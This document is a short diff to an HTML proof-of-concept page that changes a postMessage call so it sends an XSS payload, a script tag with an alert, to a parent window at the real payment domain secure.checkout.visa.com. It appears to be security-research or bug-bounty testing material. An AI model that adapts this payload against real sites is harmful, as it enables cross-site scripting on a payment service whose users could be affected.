@@ -3,15 +3,15 @@
 <head>
     <meta charset="UTF-8">
     <title>Postmessage PoC</title>
-</head>
-<body>
     <script>
         // Function to send a message to the parent window
         function sendMessageToParent() {
-            let msg = "Hello from PoC link";
+            let msg = "<script>alert('XSS from secure.checkout.visa.com');</script>";
             window.parent.postMessage(msg, 'https://secure.checkout.visa.com');
         }
     </script>
+</head>
+<body>
     <a href="#" onclick="sendMessageToParent(); return false;">PoC link</a>
 </body>
 </html>
